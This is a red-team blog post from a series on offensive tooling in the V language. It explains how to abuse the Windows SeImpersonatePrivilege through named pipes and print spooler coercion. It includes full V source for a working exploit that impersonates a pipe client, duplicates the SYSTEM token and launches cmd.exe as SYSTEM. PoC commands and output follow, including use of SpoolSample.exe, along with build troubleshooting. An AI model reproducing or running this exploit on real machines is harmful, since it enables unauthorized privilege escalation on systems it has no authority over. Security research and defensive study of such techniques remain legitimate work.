---
layout: single
title:  "OffensiVe Security with V 5 - Abusing SeImpersonatePrivilege"
date:   2023-04-17 16:55:50 -0500
categories: red-team
tags: vlang windows
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow/offensive-vlang"  
---

The `SeImpersonatePrivilege` allows any token to be impersonated in order to obtain a reference. This privilege is interesting because the **Network Service**, **Local Service** and the default **IIS** account have it assigned by default.

> Getting code execution on a web server will often give access to this privilege, and potentially the ability to escalate access.

It is possible to use the `DuplicateTokenEx` function of the **Win32 API** to create a primary token from an impersonated token and create a new process in the context of the impersonated user. If no tokens associated with other user accounts are available in memory, it is possible to force **SYSTEM** to obtain a token that can be impersonated.

To exploit this privilege, Windows *pipes* are used. The *pipes* or *interprocess communication (IPC)* is like RPC, COM or even *network sockets*. It is a section of shared memory within the kernel that processes can use to communicate. This allows separate processes to communicate without being explicitly designed to work together.

The following attack forces the **SYSTEM** account to connect to a *pipe* set up by an attacker. It can be used locally by relying on the *print spooler* service, which is started and runs in the context of **SYSTEM**.

> It is important to understand that the attack relies on the print queue monitoring changes to printer objects and sending change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the `SeImpersonatePrivilege` that impersonates a print client, we will get a **SYSTEM** token that we can spoof.

```bash
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe

whoami
nt authority\network service

whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

The `CreateNamedPipe` function is used, which creates a *pipe* in Windows.

```c
HANDLE CreateNamedPipeA(
  [in]           LPCSTR                lpName,
  [in]           DWORD                 dwOpenMode,
  [in]           DWORD                 dwPipeMode,
  [in]           DWORD                 nMaxInstances,
  [in]           DWORD                 nOutBufferSize,
  [in]           DWORD                 nInBufferSize,
  [in]           DWORD                 nDefaultTimeOut,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
```
> [CreateNamedPipeA function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)


- Note the name of the *pipe*, which must be in a standardised format and unique in the system (`\\.\pipe\test`).
- `dwOpenMode`, must describe that the *pipe* is open. In this case it must be specified with a 3, `PIPE_ACCESS_DUPLEX`, to create a bi-directional *pipe*.
- `dwPipeMode`, describes the mode in which the *pipe* should operate. It should be specified in `PIPE_TYPE_BYTE` to write and read bytes directly together with `PIPE_WAIT` to enable blocking mode.
- `nMaxInstances`, describes the maximum number of instances for the *pipes. It is mainly used to ensure efficiency for larger applications, any value between 1 and 255 will be used.
- `pnOutBufferSize` and `nInBufferSize`, define the number of bytes to use for the input and output buffers, one page of memory is selected. 0x1000` bytes.
- `nDefaultTimeOut`, define the timeout value to be used with the `WaitNamedPipe` API, in this case when using a *pipe* with a lock name, the default value of 0 can be chosen.
- `lpSecurityAttributes`, this defines a SID that details which clients can interact with the *pipe*. It is set to `null` to allow SYSTEM and local administrators access.

```c
module main
#flag windows -lAdvapi32 -lkernel32

struct SID_AND_ATTRIBUTES {
mut:
    sid        voidptr
    attributes int
}

struct TOKEN_USER {
mut:
    user SID_AND_ATTRIBUTES
}

struct PROCESS_INFORMATION {
mut:
    h_process       voidptr
    h_thread        voidptr
    dw_process_id   u32
    dw_thread_id    u32
}

struct STARTUPINFO {
mut:
    cb                 u32
    lp_reserved        &u16
    lp_desktop         &u16
    lp_title           &u16
    dw_x               u32
    dw_y               u32
    dw_x_size          u32
    dw_y_size          u32
    dw_x_count_chars   u32
    dw_y_count_chars   u32
    dw_fill_attributes u32
    dw_flags           u32
    w_show_window      u16
    cb_reserved2       u16
    lp_reserved2       &byte
    h_std_input        voidptr
    h_std_output       voidptr
    h_std_error        voidptr
}

fn C.CreateNamedPipeW(&u16, u32, u32, u32, u32, u32, u32, &C.LPSECURITY_ATTRIBUTES) int
fn C.ConnectNamedPipe(voidptr, voidptr) int
fn C.ImpersonateNamedPipeClient(voidptr) bool
fn C.GetCurrentThread() int
fn C.OpenThreadToken(voidptr, u32, bool, voidptr) bool
fn C.GetTokenInformation(voidptr, u32, voidptr, int, &int) bool
fn C.ConvertSidToStringSidA(voidptr, voidptr) bool
fn C.DuplicateTokenEx(voidptr, u32, voidptr, u32, u32, voidptr) bool
fn C.CreateProcessWithTokenW(voidptr, u32, voidptr, &u16, u32, voidptr, voidptr, STARTUPINFO, PROCESS_INFORMATION) bool

fn main() {
    pipe_name := r"\\.\pipe\alex\pipe\spoolss"
    println("[*] Creating pipe: ${pipe_name}")
    // PIPE_ACCESS_DUPLEX=0x00000003, PIPE_TYPE_BYTE|PIPE_WAIT=0x00000000, C.NULL=voidptr(0)
    h_pipe := C.CreateNamedPipeW(pipe_name.to_wide(), C.PIPE_ACCESS_DUPLEX, 0, 10, 0x1000, 0x1000, 0, voidptr(0))
    if C.GetLastError() != 0 {
        println(C.INVALID_HANDLE_VALUE)
        println(C.GetLastError())
    } else {
        println("  [!] Created pipe: ${h_pipe}")
    }

    println("[*] Connecting to the pipe...")
    result := C.ConnectNamedPipe(h_pipe, voidptr(0))
    if result == 0 {
        println(C.GetLastError())
    } else {
        println("  [!] New connection ${result}") 
    }

    C.ImpersonateNamedPipeClient(h_pipe)

    mut h_token := &char(0)
    C.OpenThreadToken(C.GetCurrentThread(), 0xF01FF, false, &h_token)
    println("  h_token: ${h_token}")


    token_inf_lenght := 0
    C.GetTokenInformation(h_token, 1, voidptr(0), token_inf_lenght, &token_inf_lenght)
    println("  token_inf_lenght: ${token_inf_lenght}")

    mut token_information := &TOKEN_USER{} 
    C.GetTokenInformation(h_token, 1, &token_information, token_inf_lenght, &token_inf_lenght)
    println("  token_information: ${token_information}")
    println("\n")

    pstr := voidptr(0)
    C.ConvertSidToStringSidA(token_information, &pstr)
    println("[!] Found SID: ${cstring_to_vstring(pstr)}" )

    mut h_system_token := &char(0)
    C.DuplicateTokenEx(h_token, 0xF01FF, voidptr(0), 2, 1, &h_system_token)
    println("  h_system_token: ${h_system_token}")

    process_information := &PROCESS_INFORMATION{}
    startup_info := &STARTUPINFO{}
    cmdline := r"C:\Windows\System32\cmd.exe"
    C.CreateProcessWithTokenW(h_system_token, 0, voidptr(0), cmdline.to_wide(), 0, voidptr(0), voidptr(0), voidptr(&startup_info), voidptr(&process_information))
}
```

```bash
> impersonate.exe
[*] Creating pipe: \\.\pipe\alex
  [!] Created pipe: 148
[*] Connecting to the pipe...

> echo 2 > \\localhost\pipe\alex

[*] Creating pipe: \\.\pipe\alex
  [!] Created pipe: 148
[*] Connecting to the pipe...
1
152
```

## POC

```bash
> whoami /user

USER INFORMATION
----------------

User Name                    SID
============================ ========
nt authority\network service S-1-5-20

> v.exe -cc tcc run impersonate.v
[*] Creating pipe: \\.\pipe\alex\pipe\spoolss
  [!] Created pipe: 184
[*] Connecting to the pipe...

```

```bash
> whoami /user

USER INFORMATION
----------------

User Name                    SID
============================ ========
nt authority\network service S-1-5-20

> SpoolSample.exe localhost localhost/pipe/alex
```

> [PrecompiledBinaries](https://github.com/jtmpu/PrecompiledBinaries)

## Troubleshooting

To check if the called functions return an error, it is recommended to use the `C.GetLastError()` function, which will return the error code returned by the function. 

> [System Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-)

```go
h_pipe := C.CreateNamedPipeW("ERRORPIPE", C.PIPE_ACCESS_DUPLEX, 0, 10, 0x1000, 0x1000, 0, voidptr(0))
if C.GetLastError() != 0 {
    println(C.GetLastError())
} else {
    println("Success!")
}

Error: 123 (0x7B)
The filename, directory name, or volume label syntax is incorrect.
```

If you encounter errors when loading features such as:

```bash
tcc: error: undefined symbol 'ImpersonateNamedPipeClient'
tcc: error: undefined symbol 'OpenThreadToken'
tcc: error: undefined symbol 'GetTokenInformation'
```

You simply need to add the function reference in the appropriate `.dll`. In the above case, all the functions correspond to the `advapi32.dll` library, so if you are using `tcc` to compile your project, you will need to add the following references in `v\thirdparty\tcc\lib\advapi32.def`.

```
LIBRARY advapi32.dll

EXPORTS
...
ImpersonateNamedPipeClient
OpenThreadToken
GetTokenInformation
ConvertSidToStringSidA
DuplicateTokenEx
CreateProcessWithTokenW
```

### Demo

<iframe width="560" height="315" src="https://www.youtube.com/embed/oR7MUZ830CE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
